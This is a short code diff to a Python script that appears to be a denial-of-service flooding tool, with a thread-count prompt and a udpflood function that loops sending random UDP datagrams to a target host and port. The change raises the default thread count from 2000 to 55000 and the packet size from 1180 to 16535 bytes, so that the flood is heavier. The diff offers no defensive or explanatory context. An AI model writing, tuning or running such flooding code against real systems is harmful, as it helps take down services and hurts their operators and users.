@@ -426,9 +426,9 @@ def numthreads():
     global threads
     try:
         print("-----------------------------")
-        threads = int(input("[*] Threads [2000]: "))
+        threads = int(input("[*] Threads [55000]: "))
     except ValueError:
-        threads = int(2000)
+        threads = int(55000)
         print ("[!] Selected Threads " +str(threads)+ " [!]\n")
     logo()
     begin()
@@ -825,7 +825,7 @@ class JSv2(threading.Thread):
 def udpflood():
     global req_code, error
     tar = (str(host_ip),int(port))
-    bytes = random._urandom(1180) #1475
+    bytes = random._urandom(16535)
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
